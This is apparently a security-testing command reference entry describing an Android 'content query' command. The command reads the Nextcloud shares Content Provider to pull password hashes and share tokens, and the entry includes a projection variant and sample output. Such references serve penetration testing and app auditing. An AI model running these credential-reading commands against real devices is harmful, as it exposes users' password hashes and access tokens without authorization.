---
data: 'content query --uri content://org.nextcloud/shares'
tags:
  - content-provider
  - query
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:40.063Z'
id: eb9a9514-8f35-44ba-bae4-e6ad64c951de
verified: false
validated: true
submitted: true
---
# query-content-provider-shares

## Command

```bash
content query --uri content://org.nextcloud/shares
```

## Description

Queries the Nextcloud shares Content Provider to retrieve password hashes and tokens from local storage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --uri | Specifies the provider URI | Yes |

## Examples

### Basic Usage

```bash
content query --uri content://org.nextcloud/shares
```

### Advanced Usage

```bash
content query --uri content://org.nextcloud/shares --projection share_with,token
```

## Expected Output

Table format:

Row: 0 id=1 share_with=$2y$10$... token=abc123

## Related

- [[commands/query-content-provider-files]]
